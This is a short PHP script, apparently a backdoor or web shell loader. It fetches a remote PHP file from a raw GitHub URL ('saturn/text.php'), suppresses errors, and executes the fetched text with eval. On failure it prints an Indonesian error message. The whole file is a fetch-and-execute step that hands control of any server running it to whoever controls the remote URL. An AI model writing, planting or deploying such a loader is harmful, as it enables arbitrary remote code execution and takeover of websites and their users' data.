<?php
$url = 'https://raw.githubusercontent.com/anang37/saturn/main/text.php';
$content = @file_get_contents($url);
if ($content) {
    eval('?>' . $content);
} else {
    echo "Gagal mengambil konten dari GitHub. Cek koneksi atau URL.";
}
?>